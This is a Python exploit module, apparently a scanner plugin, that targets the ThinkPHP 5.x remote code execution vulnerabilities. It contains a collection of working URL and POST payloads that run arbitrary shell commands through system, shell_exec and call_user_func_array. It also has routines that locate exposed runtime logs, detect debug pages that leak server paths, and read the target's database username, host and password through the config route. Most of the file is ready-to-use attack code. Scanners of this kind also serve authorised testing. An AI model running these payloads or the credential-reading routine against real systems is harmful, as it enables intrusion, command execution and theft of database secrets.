#!/usr/bin/env python3

import time
import datetime
import dateutil.relativedelta
from bs4 import BeautifulSoup
from app.lib.utils.request import request
from app.lib.utils.common import get_capta, get_useragent
from app.lib.utils.encode import urlencode, base64encode

class Thinkphp_Rce_Collection_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'ThinkPHP Collection',
            'description': 'ThinkPHP Remote Code Execution Vulnerability Collection, 受影响版本: ThinkPHP 5.0.x, 5.0.13, 5.0.23, 5.0.24, 5.1.0-5.1.16',
            'date': '2018-11-09',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        self.capta = get_capta()
        self.osname = 'Unknown'
        self.headers = {
            "User-Agent": get_useragent(),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        # 5.0.x命令执行，<=5.0.24
        self.item1 = {
            'url': self.url,
            'method': 'get',
            'payloads': [
                r"/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]={cmd}",
                #r"/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=exit(md5(%27test%27))",
                #r"/?s=index/think\request/input?data[]=exit(md5(%27test%27))&filter=assert",
                r"/?s=index/\think\view\driver\Php/display&content=<?php system('{cmd}');?>",
                r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}",
                r"/?s=index/\think\Request/input&filter[]=system&data={cmd}",
            ]
        }
        # ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
        self.item2 = {
            'url': self.url + '/?s=captcha&test=-1',
            'method': 'post',
            'payloads': [
                r'_method=__construct&filter=system&method=get&server[REQUEST_METHOD]={cmd}',
                r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={cmd}',
                r'_method=__construct&filter[]=system&method=GET&get[]={cmd}'
            ]
        }
        # ThinkPHP <= 5.0.13
        self.item3 = {
            'url': self.url + '/?s=index/index/',
            'method': 'post',
            'payloads': [
                r's={cmd}&_method=__construct&method=&filter[]=system',
                r'_method=__construct&filter[]=system&mytest={cmd}'
            ]
        }
        # ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
        self.item4 = {
            'url': self.url,
            'method': 'post',
            'payloads': [r'_method=__construct&filter[]=system&server[REQUEST_METHOD]={cmd}']
        }
        self.item_list = [self.item1, self.item2, self.item3, self.item4]

    def log_find(self):
        
        """
        检测日志文件路径

        :param:
        
        :return:
        """
        
        result = []
        now = datetime.datetime.now()
        fifteen_day = (now + dateutil.relativedelta.relativedelta(days = -15))
        one_month = (now + dateutil.relativedelta.relativedelta(months = -1))
        two_month = (now + dateutil.relativedelta.relativedelta(months = -2))
        three_month = (now + dateutil.relativedelta.relativedelta(months = -3))

        for time_dir_5 in [now.strftime("%Y%m/%d"), fifteen_day.strftime("%Y%m/%d"), one_month.strftime("%Y%m/%d"), two_month.strftime("%Y%m/%d"), three_month.strftime("%Y%m/%d")]:
            # thinkphp 5 主日志 info
            log_dir_info_5 = self.url + "/../runtime/log/{}.log".format(time_dir_5)
            # 错误日志 error
            log_dir_error_5 = self.url + "/../runtime/log/{}_error.log".format(time_dir_5)
            # sql日志 sql
            log_dir_sql_5 = self.url + "/../runtime/log/{}_sql.log".format(time_dir_5)
            try:
                info_res = request.get(url = log_dir_info_5, headers = self.headers)
                error_res = request.get(url = log_dir_error_5, headers = self.headers)
                sql_res = request.get(url = log_dir_sql_5, headers = self.headers)
                if info_res.status_code == 200 and (("[ info ]" in info_res.text) or ("[ sql ]" in info_res.text) or ("[ error ]" in info_res.text)):
                    result.append(log_dir_info_5) 
                if error_res.status_code == 200 and (("[ info ]" in error_res.text) or ("[ sql ]" in error_res.text) or ("[ error ]" in error_res.text)):
                    result.append(log_dir_error_5)
                if sql_res.status_code == 200 and (("[ info ]" in sql_res.text) or ("[ sql ]" in sql_res.text) or ("[ error ]" in sql_res.text)):
                    result.append(log_dir_sql_5)
            except Exception as e:
                # print(e)
                pass
            finally:
                pass

        # thinkphp 3 日志
        for time_dir_3 in [now.strftime("%y_%m_%d"), fifteen_day.strftime("%y_%m_%d"), one_month.strftime("%y_%m_%d"), two_month.strftime("%y_%m_%d"), three_month.strftime("%y_%m_%d")]:
            log_dir_3_1 = self.url + "/Application/Runtime/Logs/Home/{}.log".format(time_dir_3)
            log_dir_3_2 = self.url + "/Runtime/Logs/Home/{}.log".format(time_dir_3)
            log_dir_3_3 = self.url + "/Runtime/Logs/Common/{}.log".format(time_dir_3)
            log_dir_3_4 = self.url + "/Application/Runtime/Logs/Common/{}.log".format(time_dir_3)
            log_dir_3_5 = self.url + "/App/Runtime/Logs/Home/{}.log".format(time_dir_3)
            log_dir_3_6 = self.url + "/App/Runtime/Logs/{}.log".format(time_dir_3)
            log_dir_3 = [log_dir_3_1, log_dir_3_2, log_dir_3_3, log_dir_3_4, log_dir_3_5, log_dir_3_6]
            for log_path in log_dir_3:
                try:
                    log_3_res = request.get(url = log_path, headers = self.headers)
                    log_3_res.encoding = 'utf-8'
                    if log_3_res.status_code == 200 and (("INFO:" in log_3_res.text) or ("SQL语句" in log_3_res.text) or ("ERR:" in log_3_res.text)):
                        result.append(log_path)
                    else:
                        pass
                except Exception as e:
                    # print(e)
                    pass
                finally:
                    pass
        
        return result

    def check_dubug(self):
        
        """
        检测thinkphp调试模式是否打开

        :param:
        
        :return:
        """
        
        result = []
        div_html_5 = ''
        div_html_3 = ''
        debug_bool = False
        url_debug = ["indx.php", "/index.php/?s=index/inex/"]
        for path in url_debug:
            try:
                req_debug = request.get(url = self.url + path, headers = self.headers, timeout=5)
                req_debug.encoding = 'utf-8'
                # print(req_debug.text)
                if ("Environment Variables" in req_debug.text) or ("错误位置" in req_debug.text):
                    debug_bool = True
                    result.append("Debug 模式已开启!")
                    res_debug_html = BeautifulSoup(req_debug.text, 'html.parser')
                    div_html_5 = res_debug_html.findAll('div', {'class': 'clearfix'})
                    div_html_3 = res_debug_html.find('sup')
                    div_html_3_path = res_debug_html('div', {'class': 'text'})
                    result.append(div_html_5)
                    result.append(div_html_3)
                    result.append(div_html_3_path)
                    break
            except Exception as e:
                # print(e)
                pass
            finally:
                pass
        if debug_bool == False:
            print("Debug 模式未开启！")
        if debug_bool:
            if div_html_5:
                for item in div_html_5:
                    if item.strong.text == 'THINK_VERSION':
                        result.append('THINK_VERSION: ' + item.small.text.strip())
                    if item.strong.text == 'DOCUMENT_ROOT':
                        result.append('DOCUMENT_ROOT: ' + item.small.text.strip())
                    if item.strong.text == 'SERVER_ADDR':
                        result.append('SERVER_ADDR: ' + item.small.text.strip())
                    if item.strong.text == 'LOG_PATH':
                        result.append('LOG_PATH: ' + item.small.text.strip())
            elif div_html_3 and div_html_3_path:
                result.append("ThinkPHP Version: " + div_html_3.text)
                result.append("ThinkPHP Path: " + div_html_3_path[0].p.text)

    def get_mysql_conf(self):
        
        """
        尝试获取数据库配置

        :param:
        
        :return:
        """
        
        result = []
        try:
            name = request.get(url = self.url + "/?s=index/think\config/get&name=database.username", headers = self.headers)
            hostname = request.get(url = self.url + "/?s=index/think\config/get&name=database.hostname", headers = self.headers)
            password = request.get(url = self.url + "/?s=index/think\config/get&name=database.password", headers = self.headers)
            database = request.get(url = self.url + "/?s=index/think\config/get&name=database.database", headers = self.headers)
            if name.text and len(name.text) < 100:
                result.append(name.text)
            if hostname.text and len(hostname.text) < 100:
                result.append(hostname.text)
            if password.text and len(password.text) < 100:
                result.append(password.text)
            if database.text and len(database.text) < 100:
                result.append(database.text)
            return result
        except Exception as e:
            print(e)
        finally:
            pass

    def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            for item in self.item_list:
                if item['method'] == 'get':
                    for payload in item['payloads']:
                        check_payload = payload.format(cmd = 'echo %swin^dowslin$1ux' %(self.capta))
                        req = request.get(url = item['url'] + check_payload, headers = self.headers)
                        if self.capta in req.text and ('windows' in req.text or 'linux' in req.text):
                            if 'windows' in req.text:
                                self.osname = 'Windows'
                            elif 'linux' in req.text:
                                self.osname = 'Linux'
                            return True, payload
                else:
                    for payload in item['payloads']:
                        check_payload = payload.format(cmd = 'echo %swin^dowslin$1ux' %(self.capta))
                        req = request.post(url = item['url'], headers = self.headers, data = check_payload)
                        if self.capta in req.text and ('windows' in req.text or 'linux' in req.text):
                            if 'windows' in req.text:
                                self.osname = 'Windows'
                            elif 'linux' in req.text:
                                self.osname = 'Linux'
                            return True, payload, item['url']
            return False
        except Exception as e:
            # print(e)
            return False
        finally:
            pass
    
    def info(self):
        
        """
        检测是否存在信息泄露

        :param:

        :return str result
        """

        try:
            result = []
            log_result = self.log_find()
            if log_result:
                result = result + log_result
            debug_result = self.check_dubug()
            if debug_result:
                result = result + debug_result
            mysql_result = self.get_mysql_conf()
            if mysql_result:
                result = result + mysql_result
            return True, result
        except Exception as e:
            # print(e)
            return False, e
        finally:
            pass

if __name__ == "__main__":
    Thinkphp_Rce = Thinkphp_Rce_Collection_BaseVerify('http://127.0.0.1:8080')
    print(Thinkphp_Rce.check())
